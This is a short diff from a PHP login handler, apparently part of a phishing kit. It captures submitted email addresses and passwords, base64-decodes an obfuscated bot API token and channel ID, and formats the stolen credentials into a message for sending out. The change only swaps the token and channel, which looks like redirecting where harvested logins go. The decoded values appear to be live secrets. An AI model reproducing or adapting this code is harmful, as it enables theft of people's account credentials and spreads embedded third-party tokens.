@@ -90,8 +90,8 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     $login_password = $_POST["login_password"];
     
     // Obfuscated token and channel
-    $botApiToken = base64_decode('Nzg5OTE2ODYwMDpBQUd3akdDRHlpX2FXR0xhOC1WUHdOY2txUWxzMGhiTVIzYw==');
-    $channelId = base64_decode('Nzc4MDcwNzY0Mg==');
+    $botApiToken = base64_decode('NzUzNzQ5NzY5MTpBQUhidlY0QUNGM1NUd0tLRjRIR3lMcXFmbGtJMV83cGZ6Yw==');
+    $channelId = base64_decode('ODAxNzA4NjcxNQ==');
     
     $txt = "🙍 Email: {$login_email} \n 🔐 Password: {$login_password}";
 
